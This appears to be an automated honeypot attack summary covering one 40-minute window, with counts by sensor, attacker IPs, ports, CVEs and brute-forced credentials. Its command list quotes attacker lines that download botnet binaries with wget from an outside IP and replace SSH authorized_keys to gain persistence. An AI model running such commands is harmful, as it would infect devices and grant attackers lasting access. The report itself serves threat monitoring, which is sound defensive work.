## Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T01:01:36Z
**Timeframe Covered:** 2025-09-30T00:20:01Z to 2025-09-30T01:00:01Z
**Log Files Used:**
- agg_log_20250930T002001Z.json
- agg_log_20250930T004001Z.json
- agg_log_20250930T010001Z.json

### Executive Summary

This report summarizes 17,839 events captured across the honeypot infrastructure. The majority of attacks were directed at the Cowrie (SSH/Telnet) honeypot, accounting for over 63% of the total traffic. A single IP address, **160.25.118.10**, was the most prolific attacker, responsible for approximately 45% of all recorded events, indicating a targeted or automated campaign. The most frequently targeted services were SSH (Port 22) and SMTP (Port 25). Attackers were observed attempting to download and execute malicious payloads, primarily variants of the `urbotnetisass` malware, and performed system reconnaissance to identify the environment.

### Detailed Analysis

**Attacks by Honeypot**
- **Cowrie:** 11,248
- **Honeytrap:** 2,381
- **Suricata:** 1,634
- **Ciscoasa:** 1,394
- **Mailoney:** 841
- **Dionaea:** 93
- **H0neytr4p:** 87
- **Tanner:** 60
- **Adbhoney:** 30
- **ConPot:** 25
- **Sentrypeer:** 19
- **ElasticPot:** 5
- **Redishoneypot:** 8
- **Honeyaml:** 6
- **Ipphoney:** 2
- **Dicompot:** 3
- **Heralding:** 3

**Top Attacking IPs**
- **160.25.118.10:** 7,965
- **86.54.42.238:** 821
- **121.41.236.216:** 551
- **5.129.251.145:** 421
- **171.231.185.153:** 322
- **142.93.159.126:** 305
- **116.110.152.142:** 259
- **84.60.20.107:** 271
- **118.193.43.244:** 282
- **92.63.197.55:** 349
- **185.156.73.167:** 352
- **185.156.73.166:** 353
- **92.63.197.59:** 319
- **40.115.18.231:** 282

**Top Targeted Ports/Protocols**
- **22 (SSH):** 2,145
- **25 (SMTP):** 841
- **8333:** 200
- **80 (HTTP):** 72
- **443 (HTTPS):** 87
- **TCP/22:** 71
- **23 (Telnet):** 41

**Most Common CVEs**
- CVE-1999-0265
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
- CVE-2019-11500 CVE-2019-11500
- CVE-2002-1149

**Commands Attempted by Attackers**
- `uname -a`
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys...`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem`
- `w` and `whoami`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass...`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh...`

**Signatures Triggered**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- GPL ICMP redirect host
- ET INFO Reserved Internal IP Traffic
- ET SCAN Potential SSH Scan

**Users / Login Attempts (username/password)**
- root/123456789
- 345gs5662d34/345gs5662d34
- root/12345
- user/fanlongjie123
- superadmin/admin123
- test/test
- admin/admin123
- media/media

**Files Uploaded/Downloaded**
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass
- Mozi.m
- wget.sh
- w.sh
- c.sh

**HTTP User-Agents**
- No HTTP User-Agents were recorded in the logs.

**SSH Clients and Servers**
- No specific SSH client or server versions were recorded in the logs.

**Top Attacker AS Organizations**
- No attacker AS organization data was recorded in the logs.

### Key Observations and Anomalies

1.  **High-Volume Automated Attack:** The activity from IP address **160.25.118.10** is exceptionally high and consistent across the monitoring period, suggesting an automated script or botnet is actively targeting the infrastructure.
2.  **Payload Delivery:** A recurring pattern involves attempts to download and execute various ELF binaries (e.g., `urbotnetisass`) from a remote server (`94.154.35.154`). These payloads target multiple architectures (ARM, x86, MIPS), a common tactic for infecting a wide range of IoT and embedded devices.
3.  **SSH Key Manipulation:** Several commands focus on deleting existing SSH configurations (`rm -rf .ssh`) and installing a new, malicious authorized SSH key. This grants the attacker persistent, passwordless access to the compromised machine.
4.  **System Reconnaissance:** Basic commands like `uname`, `lscpu`, `whoami`, `cat /proc/cpuinfo`, and `free -m` are consistently used post-breach to gather information about the system architecture and resources. This information is likely used to deploy the correct payload or determine the machine's value.
